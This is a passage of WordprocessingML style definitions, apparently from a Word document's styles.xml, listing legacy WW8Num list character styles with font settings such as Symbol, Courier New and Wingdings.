    <w:rPr>
      <w:b w:val="0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num10z0">
    <w:name w:val="WW8Num10z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z0">
    <w:name w:val="WW8Num11z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z1">
    <w:name w:val="WW8Num11z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z2">
    <w:name w:val="WW8Num11z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z3">
    <w:name w:val="WW8Num11z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z4">
    <w:name w:val="WW8Num11z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z5">
    <w:name w:val="WW8Num11z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z6">
    <w:name w:val="WW8Num11z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z7">
    <w:name w:val="WW8Num11z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num11z8">
    <w:name w:val="WW8Num11z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z0">
    <w:name w:val="WW8Num12z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z1">
    <w:name w:val="WW8Num12z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z2">
    <w:name w:val="WW8Num12z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z3">
    <w:name w:val="WW8Num12z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z4">
    <w:name w:val="WW8Num12z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z5">
    <w:name w:val="WW8Num12z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z6">
    <w:name w:val="WW8Num12z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z7">
    <w:name w:val="WW8Num12z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num12z8">
    <w:name w:val="WW8Num12z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z0">
    <w:name w:val="WW8Num13z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z1">
    <w:name w:val="WW8Num13z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z2">
    <w:name w:val="WW8Num13z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z3">
    <w:name w:val="WW8Num13z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z4">
    <w:name w:val="WW8Num13z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z5">
    <w:name w:val="WW8Num13z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z6">
    <w:name w:val="WW8Num13z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z7">
    <w:name w:val="WW8Num13z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num13z8">
    <w:name w:val="WW8Num13z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z0">
    <w:name w:val="WW8Num14z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z1">
    <w:name w:val="WW8Num14z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z2">
    <w:name w:val="WW8Num14z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z3">
    <w:name w:val="WW8Num14z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z4">
    <w:name w:val="WW8Num14z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z5">
    <w:name w:val="WW8Num14z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z6">
    <w:name w:val="WW8Num14z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z7">
    <w:name w:val="WW8Num14z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num14z8">
    <w:name w:val="WW8Num14z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num15z0">
    <w:name w:val="WW8Num15z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num15z1">
    <w:name w:val="WW8Num15z1"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num15z2">
    <w:name w:val="WW8Num15z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z0">
    <w:name w:val="WW8Num16z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z1">
    <w:name w:val="WW8Num16z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z2">
    <w:name w:val="WW8Num16z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z3">
    <w:name w:val="WW8Num16z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z4">
    <w:name w:val="WW8Num16z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z5">
    <w:name w:val="WW8Num16z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z6">
    <w:name w:val="WW8Num16z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z7">
    <w:name w:val="WW8Num16z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num16z8">
    <w:name w:val="WW8Num16z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z0">
    <w:name w:val="WW8Num17z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z1">
    <w:name w:val="WW8Num17z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z2">
    <w:name w:val="WW8Num17z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z3">
    <w:name w:val="WW8Num17z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z4">
    <w:name w:val="WW8Num17z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z5">
    <w:name w:val="WW8Num17z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z6">
    <w:name w:val="WW8Num17z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z7">
    <w:name w:val="WW8Num17z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num17z8">
    <w:name w:val="WW8Num17z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z0">
    <w:name w:val="WW8Num18z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z1">
    <w:name w:val="WW8Num18z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z2">
    <w:name w:val="WW8Num18z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z3">
    <w:name w:val="WW8Num18z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z4">
    <w:name w:val="WW8Num18z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z5">
    <w:name w:val="WW8Num18z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z6">
    <w:name w:val="WW8Num18z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z7">
    <w:name w:val="WW8Num18z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num18z8">
    <w:name w:val="WW8Num18z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z0">
    <w:name w:val="WW8Num19z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z1">
    <w:name w:val="WW8Num19z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z2">
    <w:name w:val="WW8Num19z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z3">
    <w:name w:val="WW8Num19z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z4">
    <w:name w:val="WW8Num19z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z5">
    <w:name w:val="WW8Num19z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z6">
    <w:name w:val="WW8Num19z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z7">
    <w:name w:val="WW8Num19z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num19z8">
    <w:name w:val="WW8Num19z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z0">
    <w:name w:val="WW8Num20z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z1">
    <w:name w:val="WW8Num20z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z2">
    <w:name w:val="WW8Num20z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z3">
    <w:name w:val="WW8Num20z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z4">
    <w:name w:val="WW8Num20z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z5">
    <w:name w:val="WW8Num20z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z6">
    <w:name w:val="WW8Num20z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z7">
    <w:name w:val="WW8Num20z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num20z8">
    <w:name w:val="WW8Num20z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z0">
    <w:name w:val="WW8Num21z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z1">
    <w:name w:val="WW8Num21z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z2">
    <w:name w:val="WW8Num21z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z3">
    <w:name w:val="WW8Num21z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z4">
    <w:name w:val="WW8Num21z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z5">
    <w:name w:val="WW8Num21z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z6">
    <w:name w:val="WW8Num21z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z7">
    <w:name w:val="WW8Num21z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num21z8">
    <w:name w:val="WW8Num21z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z0">
    <w:name w:val="WW8Num22z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z1">
    <w:name w:val="WW8Num22z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z2">
    <w:name w:val="WW8Num22z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z3">
    <w:name w:val="WW8Num22z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z4">
    <w:name w:val="WW8Num22z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z5">
    <w:name w:val="WW8Num22z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z6">
    <w:name w:val="WW8Num22z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z7">
    <w:name w:val="WW8Num22z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num22z8">
    <w:name w:val="WW8Num22z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num23z0">
    <w:name w:val="WW8Num23z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num23z1">
    <w:name w:val="WW8Num23z1"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num23z2">
    <w:name w:val="WW8Num23z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num24z0">
    <w:name w:val="WW8Num24z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num24z1">
    <w:name w:val="WW8Num24z1"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num24z2">
    <w:name w:val="WW8Num24z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z0">
    <w:name w:val="WW8Num25z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z1">
    <w:name w:val="WW8Num25z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z2">
    <w:name w:val="WW8Num25z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z3">
    <w:name w:val="WW8Num25z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z4">
    <w:name w:val="WW8Num25z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z5">
    <w:name w:val="WW8Num25z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z6">
    <w:name w:val="WW8Num25z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z7">
    <w:name w:val="WW8Num25z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num25z8">
    <w:name w:val="WW8Num25z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num26z0">
    <w:name w:val="WW8Num26z0"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num26z1">
    <w:name w:val="WW8Num26z1"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num26z2">
    <w:name w:val="WW8Num26z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z0">
    <w:name w:val="WW8Num27z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z1">
    <w:name w:val="WW8Num27z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z2">
    <w:name w:val="WW8Num27z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z3">
    <w:name w:val="WW8Num27z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z4">
    <w:name w:val="WW8Num27z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z5">
    <w:name w:val="WW8Num27z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z6">
    <w:name w:val="WW8Num27z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z7">
    <w:name w:val="WW8Num27z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num27z8">
    <w:name w:val="WW8Num27z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z0">
    <w:name w:val="WW8Num28z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z1">
    <w:name w:val="WW8Num28z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z2">
    <w:name w:val="WW8Num28z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z3">
    <w:name w:val="WW8Num28z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z4">
    <w:name w:val="WW8Num28z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z5">
    <w:name w:val="WW8Num28z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z6">
    <w:name w:val="WW8Num28z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z7">
    <w:name w:val="WW8Num28z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num28z8">
    <w:name w:val="WW8Num28z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num29z0">
    <w:name w:val="WW8Num29z0"/>
    <w:rsid w:val="00F83C8C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F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num29z2">
    <w:name w:val="WW8Num29z2"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num29z3">
    <w:name w:val="WW8Num29z3"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z0">
    <w:name w:val="WW8Num30z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z1">
    <w:name w:val="WW8Num30z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z2">
    <w:name w:val="WW8Num30z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z3">
    <w:name w:val="WW8Num30z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z4">
    <w:name w:val="WW8Num30z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z5">
    <w:name w:val="WW8Num30z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z6">
    <w:name w:val="WW8Num30z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z7">
    <w:name w:val="WW8Num30z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num30z8">
    <w:name w:val="WW8Num30z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z0">
    <w:name w:val="WW8Num31z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z1">
    <w:name w:val="WW8Num31z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z2">
    <w:name w:val="WW8Num31z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z3">
    <w:name w:val="WW8Num31z3"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z4">
    <w:name w:val="WW8Num31z4"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z5">
    <w:name w:val="WW8Num31z5"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z6">
    <w:name w:val="WW8Num31z6"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z7">
    <w:name w:val="WW8Num31z7"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num31z8">
    <w:name w:val="WW8Num31z8"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z0">
    <w:name w:val="WW8Num32z0"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z1">
    <w:name w:val="WW8Num32z1"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z2">
    <w:name w:val="WW8Num32z2"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="WW8Num32z3">
